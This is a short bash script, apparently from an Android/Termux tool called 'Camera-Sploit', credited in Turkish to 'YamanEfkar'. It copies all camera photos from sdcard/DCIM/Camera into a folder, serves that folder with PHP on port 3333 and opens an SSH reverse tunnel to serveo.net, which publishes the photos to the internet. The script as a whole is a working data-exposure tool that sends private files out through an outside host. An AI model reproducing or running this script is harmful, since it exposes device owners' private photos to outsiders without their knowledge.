#!/bin/bash
if [[ -e "Lib/ok.txt" ]]; then
		cd Lib && rm -rf *.jpg
		cd / && cd sdcard/DCIM/Camera && cp *.jpg $HOME/Camera-Sploit/Lib
		cd $HOME/Camera-Sploit/Lib &&
		php -S 127.0.0.1:3333 > /dev/null 2>&1 &
		sleep 3 &&
		ssh -R 80:localhost:3333 $random@serveo.net
	else
		apt-get install php -y
		apt install openssh -y
		apt install openssl -y 
		cd Lib/ &&
		echo "YamanEfkar Tarafından kodlandı." >> ok.txt
		cd .. && bash tst.sh
	fi